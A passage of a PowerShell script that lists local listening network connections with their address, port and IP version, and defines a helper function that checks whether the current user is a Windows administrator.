        if($Connection.address.AddressFamily -eq "InterNetwork" ) { $IPType = "IPv4" } else { $IPType = "IPv6" }
        $OutputObj = New-Object -TypeName PSobject            
        $OutputObj | Add-Member -MemberType NoteProperty -Name "LocalAddress" -Value $connection.Address            
        $OutputObj | Add-Member -MemberType NoteProperty -Name "ListeningPort" -Value $Connection.Port            
        $OutputObj | Add-Member -MemberType NoteProperty -Name "IPV4Or6" -Value $IPType            
        $OutputObj            
    }            
            
} catch {            
    Write-Error "Failed to get listening connections. $_"            
}
}
function Test-Administrator  
{  
    $user = [Security.Principal.WindowsIdentity]::GetCurrent();
    (New-Object Security.Principal.WindowsPrincipal $user).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)  
}

